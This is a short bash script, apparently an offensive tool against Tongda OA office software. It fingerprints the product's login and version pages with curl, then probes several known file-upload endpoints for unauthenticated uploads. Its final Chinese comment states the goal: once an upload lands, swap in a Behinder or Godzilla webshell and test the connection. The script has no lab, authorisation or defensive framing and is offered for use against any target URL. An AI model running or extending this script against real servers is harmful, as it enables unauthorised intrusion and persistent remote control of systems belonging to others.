#!/usr/bin/env bash
TARGET="${1:?usage: bash tongda.sh http://TARGET:PORT}"
B="${TARGET%/}"
# 1) 未授权/版本指纹（只读）
for p in "/general/login/index.php" "/inc/expired.php" "/module/portal/portal.php" "/ispirit/login_code.php"; do
  printf '%-34s ' "$p"
  curl -sS -m 8 -o /dev/null -w '%{http_code} %{size_download}\n' "$B$p"
done
# 2) 上传点探测：只传无害 txt，确认是否落到可访问目录
printf 'tongda-upload-probe' > runs/probe.txt
for up in "/general/document/index.php" "/module/upload/upload.php" "/ispirit/interface/gateway.php"; do
  curl -sS -m 12 -o runs/up-resp.txt -w "$up %{http_code}\n" -F 'FILE=@runs/probe.txt' "$B$up"
done
# 判定：能拿到落盘 URL 且可访问 = 上传成立；上传后立刻换冰蝎/哥斯拉马并实测连接
